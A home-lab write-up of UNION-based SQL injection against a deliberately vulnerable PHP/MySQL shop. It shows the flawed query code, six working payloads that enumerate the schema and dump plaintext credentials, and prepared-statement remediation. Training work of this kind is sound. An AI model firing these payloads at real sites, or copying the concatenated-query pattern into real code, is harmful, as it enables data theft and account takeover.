# SQL Injection — UNION-Based Data Extraction

## Overview

As part of a structured assessment of the GingerByte e-commerce application in my home lab, I examined the product search functionality for injection vulnerabilities.

A UNION-based SQL injection vulnerability was identified in the search parameter accepted by `search.php`. The application constructed a SQL query by concatenating user input directly into the query string without sanitisation or prepared statements. This allowed me to break out of the intended query, append a `UNION SELECT` statement of my own, and retrieve arbitrary data from the database — including the contents of the `users` table.

The vulnerability was exploited through a six-stage chain, beginning with error confirmation and ending with credential extraction.

> **Scope:** All testing documented here was performed against systems in my isolated home lab. The application was deliberately configured to be vulnerable for training purposes.

---

## Lab Scope

| System | Role |
|---|---|
| Kali Linux | Attacker |
| GingerByte (Docker, port 8080) | Target |

The target application is a fictional pet supplies shop built in PHP with a MySQL backend, running locally in Docker. The vulnerable endpoint was `/search.php`, which accepted a `q` GET parameter and used it to query the `products` table.

---

## The Vulnerable Query

The search functionality was implemented as follows in `search.php`:

```php
$q = $_GET['q'] ?? '';

$sql = "SELECT id, name, description, price, image, category
        FROM products
        WHERE name LIKE '%$q%' OR description LIKE '%$q%'";

$r = $conn->query($sql);

if ($r === false) {
    $error = $conn->error; // VULNERABILITY: raw DB error exposed
}
```

Two vulnerabilities are immediately visible:

- The value of `$q` is concatenated directly into the query string with no escaping or parameterisation.
- When the query fails, `$conn->error` is printed to the page, exposing internal database error messages to the user.

---

# Stage 1 — Confirming the Injection Point

## Objective

Establish that the search parameter is injectable and that the application leaks useful error information.

## Payload

```
'
```

A single quote submitted as the search term caused the application to attempt the following query:

```sql
SELECT id, name, description, price, image, category
FROM products
WHERE name LIKE '%'%' OR description LIKE '%'%'
```

The unescaped quote broke the SQL string delimiter, producing a syntax error.

## Response

The application printed the following error to the page:

```
⚠ Database error: You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right syntax to use
near '%' OR description LIKE '%'%'' at line 3
```

## What This Confirmed

- The input is concatenated directly into the SQL query — it is injectable.
- MySQL error output is exposed on the page, leaking query structure to the attacker.
- The `OR description LIKE '%$q%'` clause is also visible in the error, revealing the full query shape.

---

# Stage 2 — Determining the Column Count

## Objective

Identify how many columns the original `SELECT` returns, as a `UNION SELECT` must return the same number of columns.

## Approach

A `UNION SELECT` with the wrong column count produces a MySQL error. The correct count produces a result. I tested with six columns based on inspection of the visible query fragments.

## Payload

```
' UNION SELECT 1,2,3,4,5,6 -- 
```

This caused the application to execute:

```sql
SELECT id, name, description, price, image, category
FROM products
WHERE name LIKE '%' UNION SELECT 1,2,3,4,5,6 -- %' OR description LIKE '%%'
```

The `-- ` (note the trailing space) comments out the remainder of the original query.

## Response

No error was returned. The page displayed the normal product results alongside an additional card containing the injected values. This confirmed the query selects **six columns**.

---

# Stage 3 — Identifying Reflected Columns

## Objective

Determine which column positions are rendered in the page output, so that subsequent payloads can be placed in a visible column.

## Observation

The injected card rendered as follows:

- **Name field:** `2`
- **Description field:** `3`
- **Price field:** `£4.00`

This confirmed that columns 2, 3, and 4 are all reflected in the output. Column 3 (mapped to `description`) was selected for subsequent payloads as it provides the most space for string output.

---

# Stage 4 — Extracting the Database Version

## Objective

Confirm controlled output by retrieving a known value from the database — the server version.

## Payload

```
' UNION SELECT 1,2,@@version,4,5,6 -- 
```

## Response

The description field of the injected card displayed:

```
5.7.44
```

This confirmed that:

- Controlled data can be extracted into the page via column 3.
- The database server is **MySQL 5.7.44**.

---

# Stage 5 — Enumerating Database Tables

## Objective

Retrieve the names of all tables in the current database using the `information_schema` metadata tables.

## Payload

```
' UNION SELECT 1,2,GROUP_CONCAT(table_name SEPARATOR ', '),4,5,6 FROM information_schema.tables WHERE table_schema=database() -- 
```

`GROUP_CONCAT` concatenates all returned table names into a single string, allowing them to be returned in one row and displayed in a single field.

## Response

The description field returned:

```
admin_notes, discount_codes, messages, order_items, orders, ...
```

The output was truncated by the page's CSS, but the table names visible included `admin_notes`, `discount_codes`, `messages`, `order_items`, and `orders`. The presence of a `users` table was inferred and confirmed in the next stage.

---

# Stage 6 — Extracting Credentials from the Users Table

## Objective

Enumerate the columns of the `users` table and extract credential data.

## Column Enumeration Payload

```
' UNION SELECT 1,2,GROUP_CONCAT(column_name SEPARATOR ', '),4,5,6 FROM information_schema.columns WHERE table_name='users' -- 
```

## Column Enumeration Response

```
id, username, password, email, role, address, created_at
```

The `users` table contained a `password` column alongside `username`.

## Credential Extraction Payload

```
' UNION SELECT 1,2,GROUP_CONCAT(username,':',password SEPARATOR ' | '),4,5,6 FROM users -- 
```

## Credential Extraction Response

```
admin:admin123 | faymee:pawsword | ...
```

Plaintext credentials for multiple user accounts were returned directly in the page, extracted from the database through the search parameter.

---

# Finding: UNION-Based SQL Injection via Search Parameter

## Description

The GingerByte application accepted a `q` GET parameter in `search.php` and concatenated it directly into a SQL query without sanitisation or use of prepared statements. An attacker could inject SQL into this parameter to append a `UNION SELECT` statement and retrieve arbitrary data from the database, including data from tables unrelated to the intended search functionality.

## Evidence

**Step 1 — Injection confirmed:**

```
GET /search.php?q=' HTTP/1.1
```

Response included:
```
Database error: You have an error in your SQL syntax … near '%' OR description LIKE '%'%''
```

**Step 2 — Column count established:**

```
GET /search.php?q=' UNION SELECT 1,2,3,4,5,6 -- 
```

No error. Injected row visible in results.

**Step 3 — Version extracted:**

```
GET /search.php?q=' UNION SELECT 1,2,@@version,4,5,6 -- 
```

Result: `5.7.44`

**Step 4 — Tables enumerated:**

```
GET /search.php?q=' UNION SELECT 1,2,GROUP_CONCAT(table_name SEPARATOR ', '),4,5,6 FROM information_schema.tables WHERE table_schema=database() -- 
```

Result: `admin_notes, discount_codes, messages, order_items, orders, ...`

**Step 5 — Users table columns enumerated:**

```
GET /search.php?q=' UNION SELECT 1,2,GROUP_CONCAT(column_name SEPARATOR ', '),4,5,6 FROM information_schema.columns WHERE table_name='users' -- 
```

Result: `id, username, password, email, role, address, created_at`

**Step 6 — Credentials extracted:**

```
GET /search.php?q=' UNION SELECT 1,2,GROUP_CONCAT(username,':',password SEPARATOR ' | '),4,5,6 FROM users -- 
```

Result: `admin:admin123 | faymee:pawsword | ...`

## Security Impact

SQL injection via a UNION-based technique allowed full enumeration of the database schema and extraction of data from any table — including user credentials stored in plaintext. In a real application, this could result in complete account compromise for all users, exposure of personally identifiable information, and depending on database permissions, potentially further host-level impact. The secondary issue of `mysqli_error()` output being returned to the user accelerated the attack by confirming the query structure at each stage.

## Remediation

**Primary fix — use prepared statements:**

```php
// Secure approach
$stmt = $conn->prepare(
    "SELECT id, name, description, price, image, category
     FROM products
     WHERE name LIKE ? OR description LIKE ?"
);
$term = '%' . $q . '%';
$stmt->bind_param('ss', $term, $term);
$stmt->execute();
$r = $stmt->get_result();
```

Prepared statements separate SQL code from data. The query structure is fixed at prepare time; user input is passed as a parameter and cannot alter the query structure regardless of its content.

**Secondary fix — suppress database errors:**

```php
// Never expose raw database errors to users
if ($r === false) {
    error_log($conn->error); // Log server-side only
    $error = 'Search unavailable. Please try again later.';
}
```

Database errors should be logged server-side and a generic message returned to the user. Exposing `mysqli_error()` output directly to the page leaks query structure, table names, and column names, reducing the effort required for a successful attack.

**Additional recommendation — store passwords as hashes:**

The extracted credentials were stored in plaintext. Passwords should be hashed using `password_hash()` with `PASSWORD_BCRYPT` or `PASSWORD_ARGON2ID`, and verified with `password_verify()`. Plaintext storage means that any data exposure — whether through SQLi, a backup leak, or insider access — results in immediate credential compromise.

---

# Key Lessons

- String concatenation of user input into SQL queries is the root cause of SQL injection. Prepared statements with parameterised queries are the correct fix, not input filtering or escaping.
- A UNION-based injection requires matching the column count of the original query. The column count can be found by incrementing the number of values in the UNION SELECT until no error is returned.
- `information_schema` is available by default in MySQL and contains the full schema of the database — table names, column names, and data types — making it a standard first step after confirming injection.
- `GROUP_CONCAT` allows multiple rows to be collapsed into a single string, which is useful when the injection point only reflects a single row.
- Database error messages exposed to users significantly accelerate exploitation by confirming query structure, error positions, and table/column names at each stage.
- Plaintext password storage compounds SQL injection — a single vulnerable parameter can result in immediate account takeover for every user in the database.

---

# Assessment Summary

A UNION-based SQL injection vulnerability was identified in the `q` parameter of `/search.php`. The application concatenated user input directly into a SQL query with no sanitisation, allowing the query to be broken and extended with attacker-controlled SQL.

Exploitation followed a six-stage chain: a single quote confirmed injection and triggered a database error that leaked query structure; a `UNION SELECT 1,2,3,4,5,6` established a six-column match; `@@version` placed in column 3 confirmed controlled output and identified MySQL 5.7.44; `GROUP_CONCAT` against `information_schema.tables` enumerated the database schema; a second `information_schema.columns` query identified the `users` table columns; and a final `GROUP_CONCAT(username,':',password)` query extracted plaintext credentials for all user accounts.

The attack required no authentication, no special tooling, and only a browser. The combination of unsanitised input, raw error output, and plaintext password storage made the full credential dump achievable in six requests.
